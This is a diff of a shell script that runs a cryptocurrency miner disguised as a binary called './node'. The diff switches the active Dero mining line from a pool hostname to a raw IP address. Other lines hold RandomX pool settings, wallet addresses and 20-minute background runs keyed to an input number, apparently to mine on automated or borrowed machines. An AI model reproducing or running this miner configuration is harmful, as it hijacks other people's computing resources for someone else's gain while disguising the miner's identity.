@@ -49,9 +49,9 @@ echo "start ${INPUT_NUMBER}"
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )
 
 
-# Dero 
-#START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r 213.171.208.37:10300 > try.log & sleep 1200 )
-START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r community-pools.mysrv.cloud:10300 > try.log & sleep 1200 )
+# Dero 213.171.208.37:10300
+START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r 213.171.208.37:10300 > try.log & sleep 1200 )
+#START=$(./node -w dero1qyjnsv7chjw73zta6chyxm4zms2yq4cgxcu9muctyurn606v0kgy7qg0dsews -r community-pools.mysrv.cloud:10300 > try.log & sleep 1200 )
 
 
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
